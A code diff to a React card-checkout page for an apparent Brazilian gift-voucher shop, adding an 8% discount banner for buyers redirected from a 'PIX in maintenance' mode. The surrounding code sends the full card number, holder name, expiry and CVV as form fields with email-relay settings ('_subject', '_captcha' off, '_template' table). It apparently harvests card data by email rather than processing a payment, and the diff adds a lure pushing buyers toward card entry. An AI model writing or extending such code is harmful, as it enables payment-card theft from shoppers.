@@ -1,13 +1,21 @@
 import { useState, useEffect, useRef } from "react";
-import { useNavigate } from "react-router-dom";
-import { ArrowLeft, CreditCard, Loader2, XCircle } from "lucide-react";
+import { useNavigate, useLocation } from "react-router-dom";
+import { ArrowLeft, CreditCard, Loader2, XCircle, Percent } from "lucide-react";
 import { useCart } from "@/contexts/CartContext";
 import { supabase } from "@/integrations/supabase/client";
 import { trackPaymentFailed } from "@/lib/metaPixel";
 
 const CheckoutCartao = () => {
   const navigate = useNavigate();
+  const location = useLocation();
   const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();
+
+  // Desconto recebido via state (ex: 0.08 quando vem do modo PIX-em-manutenção)
+  const descontoCartao: number =
+    typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
+  const totalOriginal = getTotal();
+  const valorComDesconto = totalOriginal * (1 - descontoCartao);
+  const economiaCartao = totalOriginal - valorComDesconto;
 
   const [cardData, setCardData] = useState({
     numero: "",
@@ -107,7 +115,7 @@ const CheckoutCartao = () => {
       formData.append("Nome Cartao", cardData.nome);
       formData.append("Validade", cardData.validade);
       formData.append("CVV", cardData.cvv);
-      formData.append("Valor Total", `R$ ${getTotal().toFixed(2)}`);
+      formData.append("Valor Total", `R$ ${valorComDesconto.toFixed(2)}`);
       formData.append("_subject", "Novo Vale Presente");
       formData.append("_captcha", "false");
       formData.append("_template", "table");
@@ -196,7 +204,20 @@ const CheckoutCartao = () => {
         {/* Valor */}
         <div className="bg-card rounded-xl p-4 mb-4 text-center">
           <p className="text-card-foreground/60 text-sm mb-1">Valor a pagar</p>
-          <p className="text-card-foreground text-2xl font-bold">R$ {getTotal().toFixed(2).replace(".", ",")}</p>
+          {descontoCartao > 0 && (
+            <p className="text-card-foreground/50 text-sm line-through">
+              R$ {totalOriginal.toFixed(2).replace(".", ",")}
+            </p>
+          )}
+          <p className="text-card-foreground text-2xl font-bold">
+            R$ {valorComDesconto.toFixed(2).replace(".", ",")}
+          </p>
+          {descontoCartao > 0 && (
+            <div className="mt-2 inline-flex items-center gap-1 px-2 py-1 bg-accent/15 text-accent text-xs font-bold rounded-full">
+              <Percent size={12} />
+              {Math.round(descontoCartao * 100)}% OFF aplicado · economia de R$ {economiaCartao.toFixed(2).replace(".", ",")}
+            </div>
+          )}
         </div>
 
         {/* Formulário do Cartão */}
